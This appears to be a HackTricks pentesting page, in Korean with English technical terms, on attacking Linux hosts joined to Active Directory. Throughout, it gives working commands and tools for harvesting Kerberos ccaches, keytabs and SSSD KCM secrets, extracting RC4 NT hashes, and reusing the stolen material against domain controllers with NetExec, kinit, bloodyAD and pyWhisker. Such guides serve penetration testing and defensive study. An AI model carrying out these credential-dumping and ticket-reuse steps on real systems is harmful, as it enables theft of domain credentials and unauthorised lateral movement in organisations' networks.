# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux machine도 Active Directory 환경 안에 존재할 수 있습니다.

AD 내부의 Linux machine은 **Kerberos material을 로컬에 저장**할 수 있습니다: user ccache, machine/service keytab, 그리고 SSSD-managed secrets. 이러한 artefact는 보통 다른 Kerberos credential처럼 재사용할 수 있습니다. 이들 대부분을 읽으려면 ticket의 user owner이거나 machine의 **root**여야 합니다.

## Enumeration

### AD enumeration from linux

Linux에서 AD에 접근할 수 있다면(또는 Windows의 bash에서) [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn)를 사용해 AD를 enumerate해 볼 수 있습니다.

또한 아래 페이지에서 **linux에서 AD를 enumerate하는 다른 방법**도 확인할 수 있습니다:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA는 Microsoft Windows **Active Directory**의 오픈소스 **alternative**로, 주로 **Unix** environment를 위한 것입니다. 이는 Active Directory와 유사한 관리를 위해 완전한 **LDAP directory**와 MIT **Kerberos** Key Distribution Center를 결합합니다. CA 및 RA certificate 관리를 위해 Dogtag **Certificate System**을 활용하며, 스마트카드를 포함한 **multi-factor** authentication을 지원합니다. Unix authentication process를 위해 SSSD가 통합되어 있습니다. 자세한 내용은 다음에서 확인하세요:


{{#ref}}
../freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

ticket을 건드리기 전에, **host가 AD에 어떻게 joined 되었는지** 그리고 **Kerberos material이 실제로 어디에 저장되는지**를 식별하세요. 최신 Linux host에서는 이것이 흔히 `realmd` + `adcli` + `sssd`로 처리되며, `/tmp`의 평평한 파일만 있는 것이 아닙니다:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
이것은 호스트가 AD를 신뢰하는지, SSSD가 identity나 ticket을 캐시하는지, 그리고 악용할 수 있는 **machine/service keytabs** 또는 **KCM secrets**가 있는지를 빠르게 알려줍니다.

## Playing with tickets

### Pass The Ticket

이 페이지에서는 Linux host 안에서 **kerberos tickets를 찾을 수 있는 여러 위치**를 보게 될 것이며, 다음 페이지에서는 이 CCache tickets format을 Kirbi(Windows에서 사용해야 하는 format)로 변환하는 방법과 PTT attack을 수행하는 방법도 배울 수 있습니다:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

**Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, etc.)가 필요하면 전용 페이지를 확인하세요:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### /tmp에서 CCACHE ticket 재사용

CCACHE files는 Kerberos credentials를 **저장**하는 binary format입니다. `FILE:/tmp/krb5cc_%{uid}`가 여전히 흔하지만, 현대 Linux 배포판에서는 `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, 또는 `KCM:%{uid}`도 사용합니다. tickets가 `/tmp`에 있다고 가정하기 전에 **`KRB5CCNAME`** environment variable과 `default_ccache_name` 설정을 확인하세요.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### CCACHE ticket reuse from keyring

**프로세스 메모리에 저장된 Kerberos tickets는 추출될 수 있으며**, 특히 머신의 ptrace 보호가 비활성화된 경우(`/proc/sys/kernel/yama/ptrace_scope`)에 그렇습니다. 이 목적에 유용한 도구는 [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)에 있으며, 세션에 주입하고 tickets를 `/tmp`에 덤프하여 추출을 돕습니다.

이 도구를 설정하고 사용하려면, 아래 단계를 따릅니다:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
이 절차는 다양한 세션에 주입을 시도하며, 성공 시 추출된 ticket을 `/tmp`에 `__krb_UID.ccache` 명명 규칙으로 저장해 표시합니다.

### SSSD KCM에서 CCACHE ticket 재사용

SSSD는 데이터베이스의 복사본을 `/var/lib/sss/secrets/secrets.ldb` 경로에 유지합니다. 대응하는 key는 `/var/lib/sss/secrets/.secrets.mkey` 경로의 숨김 파일로 저장됩니다. 기본적으로 이 key는 **root** 권한이 있어야만 읽을 수 있습니다.

**`SSSDKCMExtractor`**를 --database와 --key 파라미터와 함께 호출하면 데이터베이스를 파싱하고 **secrets를 decrypt**합니다.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
The **credential cache Kerberos blob can be converted into a usable Kerberos CCache** file that can be passed to Mimikatz/Rubeus.

### Quick keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### /etc/krb5.keytab에서 accounts 추출

root 권한으로 동작하는 services에 필수적인 service account keys는 **`/etc/krb5.keytab`** files에 안전하게 저장됩니다. 이 keys는 services의 passwords와 같아서, 엄격한 기밀성이 요구됩니다.

keytab file의 contents를 확인하려면 **`klist`**를 사용할 수 있습니다. Linux에서는 `klist -k -K -e`가 principals, key version numbers, encryption types, 그리고 raw key material을 출력합니다. key type이 **23 / RC4-HMAC**이면, 해당 key value는 그 principal의 **NT hash**이기도 합니다.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Linux 사용자에게는 **`KeyTabExtract`**가 RC4 HMAC 해시를 추출하는 기능을 제공하며, 이는 NTLM 해시 재사용에 활용될 수 있습니다. 다만 이는 keytab에 여전히 **etype 23 / RC4-HMAC** material이 포함되어 있을 때만 유효합니다. **AES-only** 환경에서는 재사용 가능한 NT hash를 얻지 못할 수도 있지만, Kerberos를 통해 keytab으로 직접 인증할 수는 있습니다.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
On macOS에서 **`bifrost`**는 keytab 파일 분석 도구로 사용됩니다.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
추출된 계정 및 hash 정보를 활용하면, **`NetExec`** 같은 도구를 사용해 서버에 연결할 수 있습니다.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### `/etc/krb5.keytab`에서 machine account 재사용

`realmd`/`adcli`/`sssd`로 joined된 시스템에서는 `/etc/krb5.keytab`에 보통 **computer account**와 하나 이상의 **host/service principals**가 들어 있습니다. **root** 권한이 있다면 그냥 덤프만 하지 말고, `klist -k`로 확인한 principals 중 하나를 사용해 TGT를 요청하고 Linux host 자체로서 동작하세요.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
이것은 특히 **computer object** 자체가 AD에서 delegated rights를 가지고 있거나, 호스트가 **gMSA** 같은 다른 비밀을 가져올 수 있을 때 매우 유용하다.

### Linux-first AD tooling으로 stolen Kerberos material 재사용

유효한 `ccache` 또는 사용할 수 있는 keytab이 있으면, 먼저 모든 것을 Windows 형식으로 변환하지 않고도 **Linux에서 직접** AD를 대상으로 작업할 수 있다. 많은 최신 tool은 `KRB5CCNAME` / Kerberos auth를 네이티브로 지원한다:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
이것은 **Linux post-exploitation**와 **AD object abuse** 사이의 좋은 연결 고리입니다. object-level abuse 경로 자체에 대해서는 다음을 확인하세요:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

최근 Linux 배포는 AD에서 **Managed Service Accounts**를 직접 사용할 수 있습니다. 실제로 이는 Linux 서버가 침해된 후, host keytab뿐만 아니라 gMSA에서 생성된 **service-specific keytabs**도 찾을 수 있다는 뜻입니다. 일반적으로 확인할 위치는 `/etc/gmsad.conf`, 배포별 config files, 그리고 `/etc` 아래의 추가 `*.keytab` 파일입니다.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
This gives you a reusable Kerberos identity for the SPNs bound to that gMSA **without touching any Windows endpoint**. For **domain-side** gMSA/dMSA abuse after higher privileges in AD, check:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
